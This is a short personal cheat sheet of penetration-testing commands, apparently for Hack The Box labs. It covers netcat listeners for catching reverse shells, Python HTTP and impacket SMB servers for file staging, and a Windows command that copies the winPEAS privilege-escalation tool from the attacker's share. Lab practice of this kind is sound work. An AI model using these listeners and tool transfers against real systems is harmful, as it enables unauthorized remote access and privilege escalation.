---
title: Useful commands
date: 2023-03-24 20:55:00 +0800
categories: [HTB]
tags: [Commands]
pin: false
---

## Start listener

### For Linux

```console
sudo nc -nvlp 4444
```

### For Windows

```console
sudo rlwrap nc -nvlp 443
```

### Web service

```console
sudo python3 -m http.server 80
```

### SMB service with python impacket

```console
sudo smbserver.py share . -smb2support
```

## Get resource from service

### SMB

```console
copy \\<local_ip>\share\winPEAS.exe .
```
